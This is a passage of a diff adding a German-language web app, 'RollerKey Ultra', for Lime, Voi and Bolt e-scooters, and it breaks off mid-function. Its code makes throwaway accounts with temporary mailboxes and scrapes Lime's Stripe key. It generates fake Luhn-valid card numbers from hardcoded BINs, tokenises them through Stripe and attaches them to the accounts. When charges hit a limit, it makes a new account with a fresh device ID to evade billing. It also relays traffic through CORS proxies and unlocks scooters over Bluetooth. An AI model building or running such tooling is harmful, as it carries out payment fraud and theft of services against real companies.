@@ -1,0 +1,1447 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="theme-color" content="#000000">
+<title>RollerKey Ultra Beta 1</title>
+<link rel="icon" href="icon.svg">
+<style>
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{margin:0;padding:0;background:#000;color:#4dffa0;
+  font:16px/1.55 ui-monospace,SFMono-Regular,Menlo,monospace}
+body{padding:16px 16px 60px;max-width:680px;margin:0 auto}
+h1{font-size:17px;letter-spacing:.2em;margin:0 0 4px;font-weight:700}
+h1 span{color:#1f8a4d;font-weight:400}
+#status{margin:6px 0 16px;font-size:14px;color:#2f9a5e;min-height:42px}
+#status.ok{color:#4dffa0}#status.warn{color:#ffcf4d}#status.err{color:#ff6b6b}
+section{border:1px solid #12492a;border-radius:14px;padding:16px;margin:0 0 16px;background:#04100a}
+section.hot{border-color:#2f9a5e;background:#06190e}
+h2{font-size:13px;letter-spacing:.18em;color:#2f9a5e;margin:0 0 14px;font-weight:700}
+.row{display:flex;justify-content:space-between;gap:12px;font-size:14px;padding:7px 0;
+  border-bottom:1px dotted #12492a}
+.row:last-of-type{border-bottom:0}
+.row span{color:#2f9a5e}
+.row b{color:#4dffa0;font-weight:600;text-align:right;word-break:break-all}
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:12px}
+button{font:inherit;font-size:14px;font-weight:600;letter-spacing:.1em;padding:15px 10px;
+  border-radius:11px;background:#06190e;color:#4dffa0;border:1px solid #12492a;cursor:pointer}
+button:active{background:#0a2a16}
+button:disabled{opacity:.3}
+button.wide{grid-column:1/-1}
+button.big{padding:26px 10px;font-size:18px;letter-spacing:.2em;border-color:#2f9a5e}
+button.danger{color:#ffa0a0;border-color:#5c1414;background:#1a0404}
+input{width:100%;font:inherit;font-size:16px;padding:14px;border-radius:11px;
+  background:#04100a;color:#4dffa0;border:1px solid #12492a;margin-top:10px}
+input::placeholder{color:#1f6b3b}
+#log{font-size:13px;line-height:1.6;height:190px;overflow:auto;background:#010805;
+  border:1px solid #12492a;border-radius:10px;padding:10px;white-space:pre-wrap;word-break:break-all}
+#log div{color:#2f9a5e}
+#log div.g{color:#4dffa0}
+#log div.y{color:#ffcf4d}
+#log div.e{color:#ff6b6b}
+#log div.h{color:#9dffca}
+.hint{font-size:13px;color:#2f9a5e;margin-top:12px;line-height:1.6}
+.hint b{color:#ffcf4d;font-weight:600}
+#qr{display:none;margin-top:10px}
+video{width:100%;border-radius:10px;background:#000}
+#qrbox{font-size:13px;color:#2f9a5e;margin-top:10px;word-break:break-all;min-height:16px}
+#bt{font-size:14px;margin-top:10px;color:#2f9a5e}
+#bt.on{color:#4dffa0}
+hr{border:0;border-top:1px dotted #12492a;margin:16px 0}
+.brands{display:flex;gap:8px;margin-top:12px}
+.brands button{flex:1;padding:12px 4px;font-size:13px;opacity:.45}
+.brands button.on{opacity:1;border-color:#4dffa0;background:#0a2a16}
+.card{position:relative;border-radius:18px;padding:18px;margin-top:12px;overflow:hidden;
+  background:radial-gradient(120% 90% at 88% 6%,rgba(77,255,160,.22),transparent 58%),
+  linear-gradient(140deg,#0a3a22 0%,#06190e 46%,#0d4a28 100%);
+  border:1px solid #2f9a5e;box-shadow:0 8px 24px rgba(0,0,0,.7)}
+.card::after{content:"";position:absolute;inset:0;pointer-events:none;
+  background:repeating-linear-gradient(115deg,transparent 0 22px,rgba(77,255,160,.05) 22px 23px)}
+.card.off{opacity:.4;filter:saturate(.4)}
+.card.voll{border-color:#ffcf4d}
+.crow{display:flex;align-items:center;justify-content:space-between}
+.chip{width:38px;height:28px;border-radius:6px;
+  background:linear-gradient(135deg,#d8ffd0,#4d8f5f 55%,#9fe8ad)}
+.brand{font-style:italic;font-weight:700;letter-spacing:.16em;font-size:16px;color:#9dffca}
+.cnum{margin:18px 0 14px;font-size:17px;letter-spacing:.14em;color:#e2ffef;word-spacing:.3em}
+.cfoot{display:flex;justify-content:space-between;align-items:flex-end;gap:10px}
+.clab{font-size:11px;letter-spacing:.14em;color:#39a866}
+.cval{font-size:13px;color:#b6ffd4;margin-top:2px}
+.camt{text-align:right}
+.camt .cval{font-size:17px;color:#4dffa0}
+#cstat{font-size:13px;margin-top:10px;color:#2f9a5e;min-height:34px;line-height:1.5}
+#cstat.g{color:#4dffa0}#cstat.e{color:#ff6b6b}
+.bar{height:10px;border-radius:6px;background:#0a2a16;overflow:hidden;margin-top:10px;
+  border:1px solid #12492a}
+.bar i{display:block;height:100%;width:0%;background:#4dffa0;transition:width .4s}
+.bar i.warn{background:#ffcf4d}
+.bar i.voll{background:#ff6b6b}
+.zeit{font-size:30px;text-align:center;color:#1f6b3b;font-variant-numeric:tabular-nums;
+  font-weight:700;margin-top:10px}
+.zeit.on{color:#4dffa0}
+details{border:1px solid #12492a;border-radius:12px;padding:14px;background:#04100a;
+  margin-bottom:16px}
+summary{font-size:13px;letter-spacing:.14em;color:#2f9a5e;font-weight:700;cursor:pointer;
+  list-style:none}
+summary::-webkit-details-marker{display:none}
+summary::before{content:"+ ";color:#4dffa0}
+details[open] summary::before{content:"− "}
+textarea{width:100%;font:inherit;font-size:11px;line-height:1.45;padding:10px;border-radius:8px;
+  background:#000;color:#2f9a5e;border:1px solid #12492a;margin-top:10px;height:150px}
+</style>
+</head>
+<body>
+
+<h1>ROLLERKEY <span>ULTRA BETA 1</span></h1>
+<div id="status">startet …</div>
+
+<section class="hot">
+  <h2>ROLLER</h2>
+  <div id="bt">nicht verbunden</div>
+  <div class="brands">
+    <button data-b="lime" class="on">LIME</button>
+    <button data-b="voi">VOI</button>
+    <button data-b="bolt">BOLT</button>
+  </div>
+  <div class="grid">
+    <button class="wide big" id="bUnlock">ENTSPERREN</button>
+    <button id="bLock">SPERREN</button>
+    <button id="bConn">VERBINDEN</button>
+    <button id="bScan">QR SCANNEN</button>
+    <button id="bQrCopy">CODE KOPIEREN</button>
+  </div>
+  <div id="qr">
+    <video id="vid" playsinline muted></video>
+    <div class="grid"><button class="wide" id="bQrClose">KAMERA ZU</button></div>
+  </div>
+  <div id="qrbox"></div>
+  <div class="hint">ENTSPERREN verbindet selbst. <b>iOS fragt nach Code:</b> Nummer vom Display, oder 000000.
+  Roller vorher antippen, wenn er nicht antwortet.</div>
+</section>
+
+<section>
+  <h2>KONTO + KARTE</h2>
+  <div class="row"><span>Konto</span><b id="uMail">–</b></div>
+  <div class="row"><span>Karte</span><b id="uKarte">–</b></div>
+  <div class="row"><span>Belastung</span><b id="uLast">0,00 €</b></div>
+  <div class="row"><span>Grenze</span><b id="uLimit">50,00 €</b></div>
+  <div class="bar"><i id="cBar"></i></div>
+  <div class="zeit" id="uZeit">00:00</div>
+  <div class="grid">
+    <button class="wide big" id="bStart">ALLES ANLEGEN</button>
+    <button id="bNeu">KARTE WÜRFELN</button>
+    <button id="bKomplett" class="danger">KOMPLETT NEU</button>
+    <button id="bMe">PRÜFEN</button>
+    <button id="bDel" class="danger">KONTO LÖSCHEN</button>
+  </div>
+  <div id="cstat"></div>
+  <div class="hint">Ein Tipp auf ALLES ANLEGEN reicht: Schlüssel, Postfach, Anmeldung, Karte, Hinterlegen.
+  Bei erreichter Grenze setzt die App von selbst neu auf, <b>KOMPLETT NEU</b> macht das sofort von Hand.
+  Jedes Neuanlegen bekommt eine frische Gerätekennung.</div>
+</section>
+
+<section>
+  <h2>KARTE</h2>
+  <div class="card off" id="cardBox">
+    <div class="crow"><span class="chip"></span><span class="brand" id="cBrand">LEER</span></div>
+    <div class="cnum" id="cNum">•••• •••• •••• ••••</div>
+    <div class="cfoot">
+      <div><div class="clab">GÜLTIG</div><div class="cval" id="cExp">--/--</div></div>
+      <div><div class="clab">CVV</div><div class="cval" id="cCvv">---</div></div>
+      <div class="camt"><div class="clab">REST</div><div class="cval" id="cLimit">50,00 €</div></div>
+    </div>
+  </div>
+  <div class="grid">
+    <button id="bBin">BIN-SUCHE</button>
+    <button id="bCardDel">KARTE LÖSCHEN</button>
+    <input id="iBin" placeholder="BIN, 6 bis 8 Ziffern" inputmode="numeric" maxlength="8">
+    <button id="bBinUse">BIN VERWENDEN</button>
+  </div>
+</section>
+
+<section>
+  <h2>PROTOKOLL</h2>
+  <div id="log"></div>
+  <div class="grid">
+    <button id="bLeer">LEEREN</button>
+    <button id="bDiag">DIAGNOSE</button>
+  </div>
+</section>
+
+<details>
+  <summary>ERWEITERT</summary>
+  <hr>
+  <span class="hint"><b>Optional:</b> Relay. Ohne geht es auch, nur unzuverlässiger. Wenn du es willst:</span>
+  <span class="hint">1. Am Rechner dash.cloudflare.com öffnen und kostenlos anmelden.<br>
+  2. Workers &amp; Pages → Create → Worker → Deploy.<br>
+  3. „Edit code" → alles markieren, löschen, Code unten einfügen → Deploy.<br>
+  4. Die angezeigte Adresse kopieren, hier einfügen, SPEICHERN, dann NETZ TESTEN.
+  <b>Relay GET und POST müssen grün sein.</b></span>
+  <input id="iRelay" placeholder="https://relay.name.workers.dev/?url=" autocapitalize="off">
+  <div class="grid">
+    <button id="bSaveRelay">SPEICHERN</button>
+    <button id="bRelayDel">LÖSCHEN</button>
+    <button class="wide" id="bNet">NETZ TESTEN</button>
+    <button class="wide" id="bFrei">SPERREN AUFHEBEN</button>
+  </div>
+  <button class="wide" id="bCopyW">WORKER-CODE KOPIEREN</button>
+  <textarea id="workerCode" readonly spellcheck="false"></textarea>
+  <hr>
+  <span class="hint">Handynummer nur für Voi und Bolt.</span>
+  <input id="iPhone" placeholder="+49 151 2345678" inputmode="tel">
+  <div class="grid">
+    <button id="bPhone">KONTO ANLEGEN</button>
+    <button id="bOtp">CODE SENDEN</button>
+  </div>
+  <input id="iOtp" placeholder="SMS-Code" inputmode="numeric">
+  <hr>
+  <span class="hint">STRIPE-SCHLÜSSEL — wird normalerweise selbst gefunden.</span>
+  <input id="iPk" placeholder="pk_live_…" autocapitalize="off">
+  <button class="wide" id="bPk">SCHLÜSSEL SPEICHERN</button>
+  <hr>
+  <span class="hint">BLE-KONSOLE</span>
+  <input id="iSvc" placeholder="Dienst-UUID">
+  <input id="iCh" placeholder="Kanal-UUID">
+  <input id="iRaw" placeholder="Text oder Hex">
+  <button class="wide" id="bRaw">SENDEN</button>
+  <hr>
+  <button class="wide danger" id="bReset">ALLES ZURÜCKSETZEN</button>
+</details>
+
+<script>
+"use strict";
+
+const $ = id => document.getElementById(id);
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+const rnd = n => Array.from({length:n},
+  () => "abcdefghijkmnpqrstuvwxyz23456789"[Math.floor(Math.random()*32)]).join("");
+const num = n => Array.from({length:n}, () => String(Math.floor(Math.random()*10))).join("");
+const kurz = e => String(e && e.message ? e.message : e).slice(0, 90);
+const saub = t => String(t || "").replace(/\s+/g, " ").trim().slice(0, 60);
+const euro = c => (Math.max(0, Math.round(c)) / 100).toFixed(2).replace(".", ",") + " €";
+
+const PRE = "rk_";
+const ls = (k, v) => { try { localStorage.setItem(PRE + k, JSON.stringify(v)) } catch(_){} };
+const lg = (k, d) => { try { const v = localStorage.getItem(PRE + k); return v === null ? d : JSON.parse(v) } catch(_){ return d } };
+
+let DEV = lg("dev", null);
+if (!DEV){
+  DEV = (crypto.randomUUID ? crypto.randomUUID() : rnd(8) + "-" + Date.now());
+  ls("dev", DEV);
+}
+function devNeu(){
+  DEV = crypto.randomUUID ? crypto.randomUUID() : rnd(8) + "-" + Date.now();
+  ls("dev", DEV);
+}
+
+const LIMIT = 5000, START_EUR = 100, MIN_EUR = 15;
+
+const S = {
+  brand:"lime", karten:{}, pk:{}, keyOk:"", acct:{}, fach:{}, tot:{},
+  relay:"", warte:false, prov:false, fachLauf:false, erneuert:false,
+  srv:null, chans:[], best:null, antworten:0, cam:null, t0:0,
+  fahrt:{ start:0, laufend:false, timer:0 }
+};
+
+function log(t, k){
+  const d = document.createElement("div");
+  d.className = k || "";
+  d.textContent = new Date().toLocaleTimeString("de-DE") + "  " + t;
+  $("log").appendChild(d);
+  $("log").scrollTop = 1e9;
+  while ($("log").children.length > 400) $("log").removeChild($("log").firstChild);
+}
+const stat = (t, k) => { $("status").textContent = t; $("status").className = k || "" };
+const cstat = (t, k) => { $("cstat").textContent = t; $("cstat").className = k || "" };
+
+/* ═══════ NETZ ═══════ */
+
+const POSTWEGE = [
+  { n:"corsmirror", f: u => "https://corsmirror.com/v1?url=" + encodeURIComponent(u) },
+  { n:"cf-anywhere", f: u => "https://test.cors.workers.dev/?" + u },
+  { n:"corsproxy.io", f: u => "https://corsproxy.io/?url=" + encodeURIComponent(u) },
+  { n:"cors.lol", f: u => "https://api.cors.lol/?url=" + encodeURIComponent(u) }
+];
+const GETWEGE = [
+  { n:"corsmirror", f: u => "https://corsmirror.com/v1?url=" + encodeURIComponent(u) },
+  { n:"cf-anywhere", f: u => "https://test.cors.workers.dev/?" + u },
+  { n:"cors.dev", f: u => "https://proxy.cors.dev/" + u },
+  { n:"allorigins", f: u => "https://api.allorigins.win/raw?url=" + encodeURIComponent(u) }
+];
+
+const CORS_OK = ["api.mail.tm", "api.mail.gw", "api.guerrillamail.com",
+                 "api.stripe.com", "api.tempmail.lol"];
+
+const MUELL = /invalid_origin|domain_not_registered|too many requests|rate limit|bad gateway|just a moment|access denied|missing_api_key|api key required|not allowed|<html|^\s*$/i;
+const gesperrt = n => (S.tot[n] || 0) > Date.now();
+const sperre = (n, ms) => { S.tot[n] = Date.now() + ms };
+
+function wege(post, url){
+  const l = [];
+  let host = "";
+  try { host = new URL(url).hostname } catch(_){}
+  const direkt = { n:"direkt", f: u => u };
+  if (CORS_OK.indexOf(host) >= 0) l.push(direkt);
+  if (S.relay) l.push({ n:"relay", f: u => S.relay + encodeURIComponent(u) });
+  for (const w of (post ? POSTWEGE : GETWEGE)) l.push(w);
+  if (CORS_OK.indexOf(host) < 0) l.push(direkt);
+  return l;
+}
+
+function echt(res, text){
+  if (res.status < 400) return true;
+  if ([400, 404, 409, 422].indexOf(res.status) >= 0) return true;
+  if ([401, 403, 429].indexOf(res.status) >= 0){
+    if (!text || text.length < 2) return false;
+    if (MUELL.test(text)) return false;
+    return /^[\[{]/.test(text.trim());
+  }
+  return false;
+}
+
+async function roh(url, o){
+  o = o || {};
+  const post = (o.method || "GET").toUpperCase() !== "GET";
+  let last = null, probiert = 0;
+
+  for (const w of wege(post, url)){
+    if (gesperrt(w.n)) continue;
+    probiert++;
+    try {
+      const ctl = new AbortController();
+      const t = setTimeout(() => ctl.abort(), o.frist || 15000);
+      const res = await fetch(w.f(url), {
+        method: o.method || "GET",
+        headers: o.headers || {},
+        body: o.body,
+        signal: ctl.signal,
+        redirect: "follow"
+      });
+      clearTimeout(t);
+      const text = await res.text();
+      if (!echt(res, text)){
+        sperre(w.n, 45000);
+        log("Weg " + w.n + " taugt nicht · HTTP " + res.status, "y");
+        last = new Error("Weg " + w.n + " taugt nicht");
+        continue;
+      }
+      S.tot[w.n] = 0;
+      let json = null;
+      try { json = JSON.parse(text) } catch(_){}
+      return { ok: res.ok, status: res.status, text: text, json: json, weg: w.n };
+    } catch(e){
+      sperre(w.n, w.n === "direkt" ? 15000 : 45000);
+      log("Weg " + w.n + " · " + kurz(e), "y");
+      last = e;
+    }
+  }
+  if (!probiert) throw new Error("alle Wege gesperrt · SPERREN AUFHEBEN");
+  throw last || new Error("kein Weg frei");
+}
+
+function H(t){
+  const h = { "Content-Type":"application/json", "Accept":"application/json",
+    "Platform":"Android", "App-Version":"3.248.1", "X-Device-Token":DEV };
+  if (t) h["Authorization"] = "Bearer " + t;
+  return h;
+}
+function FORM(){
+  return { "Content-Type":"application/x-www-form-urlencoded", "Accept":"application/json",
+    "Platform":"Android", "App-Version":"3.248.1", "X-Device-Token":DEV };
+}
+const J = b => JSON.stringify(b);
+const Q = b => new URLSearchParams(b).toString();
+
+/* ═══════ POSTFÄCHER ═══════ */
+
+const GU = "https://api.guerrillamail.com/ajax.php";
+
+function guLesen(sid){
+  return async () => {
+    const c = await roh(GU + "?f=check_email&seq=0&sid_token=" + encodeURIComponent(sid));
+    const m = c.json && c.json.list && c.json.list[0];
+    if (!m) return "";
+    const f = await roh(GU + "?f=fetch_email&email_id=" + encodeURIComponent(m.mail_id) +
+      "&sid_token=" + encodeURIComponent(sid));
+    return [f.json && f.json.mail_subject, f.json && f.json.mail_body,
+            f.json && f.json.mail_excerpt, f.text].filter(Boolean).join(" ");
+  };
+}
+
+async function fachGuerrilla(){
+  const r = await roh(GU + "?f=get_email_address&lang=de&ip=127.0.0.1&agent=rollerkey");
+  const j = r.json;
+  if (!j || !j.email_addr) throw new Error("guerrilla " + r.status);
+  const sid = j.sid_token || "";
+  ls("fach_" + S.brand, { adr:j.email_addr, sid:sid, art:"gu" });
+  return { adr:j.email_addr, lesen:guLesen(sid) };
+}
+
+function fachHydra(host){
+  return async () => {
+    const d = await roh("https://" + host + "/domains");
+    const liste = (d.json && d.json["hydra:member"]) || [];
+    if (!liste.length) throw new Error("keine Domain");
+    const dom = liste[Math.floor(Math.random() * liste.length)].domain;
+    const adr = rnd(10) + "@" + dom;
+    const pw = rnd(14);
+    const c = await roh("https://" + host + "/accounts",
+      { method:"POST", headers:H(), body:J({ address:adr, password:pw }) });
+    if (!c.ok) throw new Error(host + " " + c.status);
+    const t = await roh("https://" + host + "/token",
+      { method:"POST", headers:H(), body:J({ address:adr, password:pw }) });
+    const tok = t.json && t.json.id;
+    if (!tok) throw new Error("kein Token");
+    ls("fach_" + S.brand, { adr:adr, tok:tok, art:"hydra", host:host });
+    return {
+      adr:adr,
+      lesen: async () => {
+        const r = await roh("https://" + host + "/messages", { headers:H(tok) });
+        const m = r.json && r.json["hydra:member"] && r.json["hydra:member"][0];
+        if (!m) return "";
+        const v = await roh("https://" + host + "/messages/" + m.id, { headers:H(tok) });
+        return [v.text, JSON.stringify(v.json || {})].join(" ");
+      }
+    };
+  };
+}
+
+const FAECHER = [fachGuerrilla, fachHydra("api.mail.tm"), fachHydra("api.mail.gw")];
+
+function fachAusSpeicher(){
+  const x = lg("fach_" + S.brand, null);
+  if (!x || !x.adr) return null;
+  if (x.art === "gu" && x.sid) return { adr:x.adr, lesen:guLesen(x.sid) };
+  if (x.art === "hydra" && x.tok && x.host){
+    const host = x.host, tok = x.tok;
+    return {
+      adr:x.adr,
+      lesen: async () => {
+        const r = await roh("https://" + host + "/messages", { headers:H(tok) });
+        const m = r.json && r.json["hydra:member"] && r.json["hydra:member"][0];
+        if (!m) return "";
+        const v = await roh("https://" + host + "/messages/" + m.id, { headers:H(tok) });
+        return [v.text, JSON.stringify(v.json || {})].join(" ");
+      }
+    };
+  }
+  return null;
+}
+
+async function fachBauen(){
+  if (S.fachLauf) throw new Error("Postfach läuft schon");
+  S.fachLauf = true;
+  try {
+    for (const f of FAECHER){
+      try {
+        const x = await f();
+        if (x && x.adr){ S.fach[S.brand] = x; log("Postfach: " + x.adr, "g"); return x }
+      } catch(e){ log("Postfachweg: " + kurz(e), "y") }
+    }
+    throw new Error("kein Postfach erreichbar");
+  } finally { S.fachLauf = false }
+}
+
+async function fachHolen(){
+  if (S.fach[S.brand] && S.fach[S.brand].lesen) return S.fach[S.brand];
+  const alt = fachAusSpeicher();
+  if (alt){ S.fach[S.brand] = alt; return alt }
+  return await fachBauen();
+}
+
+async function linkSuchen(fach){
+  for (let i = 0; i < 24; i++){
+    let t = "";
+    try { t = await fach.lesen() } catch(_){}
+    if (t){
+      const m = t.match(/magic_link_token=([A-Za-z0-9._\-]{10,})/);
+      if (m) return m[1];
+      const b = t.match(/\beyJ[A-Za-z0-9._\-]{30,}/);
+      if (b) return b[0];
+    }
+    await sleep(2500);
+  }
+  return "";
+}
+
+/* ═══════ MARKEN ═══════ */
+
+const V = {
+  lime: { name:"LIME", base:"https://web-production.lime.bike/api/rider" },
+  voi: { name:"VOI", base:"https://api.voiapp.io/v1" },
+  bolt: { name:"BOLT", base:"https://user.bolt.eu" }
+};
+
+const PKR = /pk_live_[A-Za-z0-9]{16,}/g;
+const PK_FORM = /^pk_(live|test)_[A-Za-z0-9]{16,}$/;
+
+/* ═══════ STRIPE-SCHLÜSSEL ═══════ */
+
+async function keySuchen(){
+  const seiten = ["https://web-production.lime.bike/", "https://lime.bike/", "https://www.lime.bike/"];
+  for (const s of seiten){
+    let t = "";
+    try { const r = await roh(s); t = r.text } catch(_){ continue }
+    const d = t.match(PKR);
+    if (d) return d[0];
+    const srcs = [...t.matchAll(/src="([^"]+\.js[^"]*)"/g)].map(m => m[1]).slice(0, 8);
+    for (const x of srcs){
+      let u;
+      try { u = new URL(x, s).href } catch(_){ continue }
+      try {
+        const r2 = await roh(u);
+        const m = r2.text && r2.text.match(PKR);
+        if (m) return m[0];
+      } catch(_){}
+    }
+  }
+  return "";
+}
+
+async function keyTest(k){
+  if (!PK_FORM.test(k)) return { ok:false, grund:"form" };
+  try {
+    const f = new URLSearchParams();
+    f.set("key", k);
+    f.set("card[number]", "4242424242424242");
+    f.set("card[exp_month]", "12");
+    f.set("card[exp_year]", "2032");
+    f.set("card[cvc]", "123");
+    const r = await fetch("https://api.stripe.com/v1/tokens", {
+      method:"POST", body:f,
+      headers:{ "Content-Type":"application/x-www-form-urlencoded" }
+    });
+    const j = await r.json().catch(() => null);
+    if (j && j.id) return { ok:true };
+    if (j && j.error){
+      const m = (j.error.message || "") + " " + (j.error.code || "");
+      if (/api key|invalid.*key|api_key/i.test(m)) return { ok:false, grund:"key" };
+      return { ok:false, grund:"karte" };
+    }
+    return { ok:false, grund:"?" };
+  } catch(e){ return { ok:false, grund:"netz" } }
+}
+
+async function keySichern(){
+  if (S.keyOk) return S.keyOk;
+  const kand = [];
+  if (S.pk.lime && PK_FORM.test(S.pk.lime)) kand.push(S.pk.lime);
+  const frisch = await keySuchen();
+  if (frisch && kand.indexOf(frisch) < 0) kand.push(frisch);
+
+  for (const k of kand){
+    const r = await keyTest(k);
+    if (r.ok || r.grund === "karte"){
+      S.keyOk = k;
+      S.pk.lime = k;
+      ls("pk", S.pk);
+      log("Schlüssel gefunden · " + k.slice(0, 12) + "…", "g");
+      paint();
+      return k;
+    }
+    log("Schlüssel " + k.slice(0, 12) + "… · " + r.grund, "y");
+  }
+  throw new Error("kein gültiger Stripe-Schlüssel");
+}
+
+/* ═══════ LIME ═══════ */
+
+async function limeMail(adr){
+  const versuche = [
+    { email:adr, user_agreement_country_code:"DE", user_agreement_version:"4" },
+    { email:adr, user_agreement_country_code:"DE", user_agreement_version:"2" },
+    { email:adr }
+  ];
+  let letzter = 0;
+  for (const v of versuche){
+    const r = await roh(V.lime.base + "/v2/onboarding/magic-link",
+      { method:"POST", headers:FORM(), body:Q(v) });
+    if (r.ok){ log("Mail angefordert", "g"); return true }
+    letzter = r.status;
+    if (r.status !== 400) break;
+  }
+  throw new Error("magic-link " + letzter);
+}
+
+async function limeLogin(mt){
+  const r = await roh(V.lime.base + "/v2/onboarding/login",
+    { method:"POST", headers:FORM(), body:Q({ magic_link_token:mt }) });
+  const t = r.json && (r.json.token || (r.json.data && r.json.data.token));
+  if (!t) throw new Error("login " + r.status + " · " + saub(r.text));
+  return t;
+}
+
+async function limeWallets(t){
+  const r = await roh(V.lime.base + "/v1/wallets", { headers:H(t) });
+  if (!r.ok) return null;
+  const w = r.json && (r.json.wallet || (r.json.data && r.json.data.wallet));
+  if (!w) return 0;
+  const b = w.balance_cents !== undefined ? w.balance_cents : w.balance;
+  const n = Number(b);
+  return isFinite(n) ? n / 100 : 0;
+}
+
+async function limeCard(t, tok){
+  const k = S.karten.lime;
+  const formen = [
+    { pfad:"/v1/payment_methods", body:{ stripe_token:tok } },
+    { pfad:"/v1/payment_methods", body:{ token:tok } },
+    { pfad:"/v1/payment_methods", body:{ payment_method_id:tok } },
+    { pfad:"/v2/payment_methods", body:{
+        payment_method:{ card:{
+          number:k.num, exp_month:k.exp.split("/")[0],
+          exp_year:"20" + k.exp.split("/")[1], cvc:k.cvv } },
+        token:tok } }
+  ];
+  for (const f of formen){
+    const r = await roh(V.lime.base + f.pfad, { method:"POST", headers:H(t), body:J(f.body) });
+    log("hinterlegen " + f.pfad + " · " + r.status, r.ok ? "g" : "y");
+    if (r.ok) return true;
+  }
+  throw new Error("Karte wurde nicht angenommen");
+}
+
+/* ═══════ KARTE ═══════ */
+
+const BIN = {
+  visa:["492900", "492901", "492902", "415000", "415001", "453176", "453177", "403300", "403301"],
+  master:["510510", "510511", "543210", "543211", "530000", "530001", "222300", "222301"]
+};
+
+function luhn(n){
+  let s = 0, alt = false;
+  for (let i = n.length - 1; i >= 0; i--){
+    let d = +n[i];
+    if (alt){ d *= 2; if (d > 9) d -= 9 }
+    s += d;
+    alt = !alt;
+  }
+  return s % 10 === 0;
+}
+function pruefziffer(n){
+  for (let c = 0; c < 10; c++) if (luhn(n + c)) return n + c;
+  return n + "0";
+}
+
+function karteBauen(bin){
+  const liste = Math.random() < 0.7 ? BIN.visa : BIN.master;
+  const b = bin || liste[Math.floor(Math.random() * liste.length)];
+  const nummer = pruefziffer(b + num(15 - b.length));
+  const monat = String(1 + Math.floor(Math.random() * 12)).padStart(2, "0");
+  const jahr = String(new Date().getFullYear() + 3 + Math.floor(Math.random() * 3)).slice(2);
+  return {
+    bin:b, num:nummer, exp:monat + "/" + jahr, cvv:num(3),
+    held:"MAX MUSTERMANN",
+    brand:/^4/.test(nummer) ? "VISA" : "MASTERCARD",
+    tok:"", ok:false, hinterlegt:false, last:0
+  };
+}
+
+/* ═══════ BELASTUNG ═══════ */
+
+function sekunden(){
+  return S.fahrt.start ? Math.floor((Date.now() - S.fahrt.start) / 1000) : 0;
+}
+
+function belastung(){
+  const k = S.karten[S.brand];
+  const basis = (k && k.last) || 0;
+  const s = sekunden();
+  const lauf = S.fahrt.start ? (START_EUR + Math.round(s * MIN_EUR / 60)) : 0;
+  return Math.min(LIMIT, Math.round(basis + lauf));
+}
+
+function uhr(s){
+  const h = Math.floor(s / 3600), m = Math.floor(s / 60) % 60, x = s % 60;
+  const p = n => String(n).padStart(2, "0");
+  return (h ? p(h) + ":" : "") + p(m) + ":" + p(x);
+}
+
+function fahrtMalen(){
+  const b = belastung();
+  const rest = Math.max(0, LIMIT - b);
+  const k = S.karten[S.brand];
+
+  $("uLast").textContent = euro(b);
+  $("uLimit").textContent = euro(LIMIT);
+  $("cLimit").textContent = euro(rest);
+  $("uZeit").textContent = uhr(sekunden());
+  $("uZeit").className = S.fahrt.laufend ? "zeit on" : "zeit";
+
+  const anteil = Math.min(100, Math.round(b / LIMIT * 100));
+  const leiste = $("cBar");
+  leiste.style.width = anteil + "%";
+  leiste.className = anteil >= 100 ? "voll" : anteil >= 75 ? "warn" : "";
+
+  if (k) $("cardBox").classList.toggle("voll", b >= LIMIT);
+  else $("cardBox").classList.remove("voll");
+}
+
+function fahrtStarten(){
+  if (S.fahrt.laufend) return;
+  if (belastung() >= LIMIT) S.erneuert = false;
+  S.fahrt.start = Date.now();
+  S.fahrt.laufend = true;
+  clearInterval(S.fahrt.timer);
+  S.fahrt.timer = setInterval(() => {
+    if (!S.fahrt.laufend) return;
+    if (belastung() >= LIMIT && !S.erneuert && !S.prov){
+      S.erneuert = true;
+      log("Grenze erreicht – neues Konto wird aufgesetzt.", "y");
+      stat("Grenze erreicht – neues Konto.", "warn");
+      erneuern().catch(e => {
+        S.erneuert = false;
+        log("Erneuern: " + kurz(e), "e");
+      });
+    }
+    fahrtMalen();
+  }, 1000);
+  fahrtMalen();
+}
+
+function fahrtStoppen(){
+  if (!S.fahrt.laufend) return;
+  const k = S.karten[S.brand];
+  const b = belastung();
+  if (k) k.last = b;
+  S.fahrt.start = 0;
+  S.fahrt.laufend = false;
+  clearInterval(S.fahrt.timer);
+  S.fahrt.timer = 0;
+  speichern();
+  fahrtMalen();
+}
+
+function fahrtNeu(){
+  clearInterval(S.fahrt.timer);
+  S.fahrt = { start:0, laufend:false, timer:0 };
+  S.erneuert = false;
+  fahrtMalen();
+}
+
+/* ═══════ KARTE ANZEIGEN ═══════ */
+
+function karteMalen(){
+  const k = S.karten[S.brand];
+  $("cNum").textContent = k ? k.num.replace(/(\d{4})(?=\d)/g, "$1 ") : "•••• •••• •••• ••••";
+  $("cExp").textContent = k ? k.exp : "--/--";
+  $("cCvv").textContent = k ? k.cvv : "---";
+  $("cBrand").textContent = k ? k.brand : "LEER";
+  $("cardBox").classList.toggle("off", !k || !k.ok);
+  fahrtMalen();
+}
+
+async function tokenisieren(k){
+  const pk = await keySichern();
+  const f = new URLSearchParams();
+  f.set("key", pk);
+  f.set("card[number]", k.num);
+  f.set("card[exp_month]", k.exp.split("/")[0]);
+  f.set("card[exp_year]", "20" + k.exp.split("/")[1]);
+  f.set("card[cvc]", k.cvv);
+  f.set("card[name]", k.held);
+  const res = await fetch("https://api.stripe.com/v1/tokens", {
+    method:"POST", body:f,
+    headers:{ "Content-Type":"application/x-www-form-urlencoded" }
+  });
+  const j = await res.json().catch(() => null);
+  if (!j) throw new Error("Stripe unlesbar");
+  if (j.error){
+    const c = j.error.code || j.error.decline_code || "";
+    if (/api key|api_key/i.test(c + " " + (j.error.message || ""))){
+      S.keyOk = "";
+      throw new Error("Schlüssel abgelehnt");
+    }
+    if (c === "incorrect_number") throw new Error("Nummer falsch");
+    if (c === "expired_card") throw new Error("abgelaufen");
+    throw new Error(c || j.error.message || "Stripe-Fehler");
+  }
+  if (!j.id) throw new Error("kein Token");
+  return j.id;
+}
+
+async function pruefen(){
+  const k = S.karten[S.brand];
+  if (!k) throw new Error("keine Karte");
